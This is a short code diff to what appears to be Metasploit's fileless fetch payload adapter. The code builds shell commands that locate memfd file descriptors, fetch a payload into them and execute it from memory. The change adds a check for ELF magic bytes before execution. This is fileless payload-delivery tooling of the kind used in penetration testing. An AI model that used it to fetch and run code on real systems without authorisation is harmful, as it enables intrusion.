@@ -186,7 +186,6 @@ module Msf::Payload::Adapter::Fetch::Fileless
     end
     return payload
   end
-  
 
   def _generate_jmp_instruction(arch)
     #
@@ -293,7 +292,7 @@ def _generate_fileless_shell(get_file_cmd, arch)
 
   cmd << 'then for f in $(find ./fd -type l -perm u=rwx 2>/dev/null);'
   cmd << 'do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ];'
-  cmd << "then if $(#{get_file_cmd} >/dev/null);"
+  cmd << "then if #{get_file_cmd} >/dev/null && [ \"$(dd if=$f bs=1 count=4 2>/dev/null)\" = \"$(printf '\\177ELF')\" ];"
   cmd << 'then $f & FOUND=1;break;'
   cmd << 'fi;'
   cmd << 'fi;'
@@ -326,7 +325,7 @@ end
     # and execute it
     cmd << '; then for f in $(find /proc/$i/fd -type l -perm u=rwx 2>/dev/null)'
     cmd << '; do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ]'
-    cmd << "; then if $(#{get_file_cmd} >/dev/null)"
+    cmd << "; then if #{get_file_cmd} >/dev/null && [ \"$(dd if=$f bs=1 count=4 2>/dev/null)\" = \"$(printf '\\177ELF')\" ]"
     cmd << '; then $f'
     cmd << '; FOUND=1'
     cmd << '; exit 1'
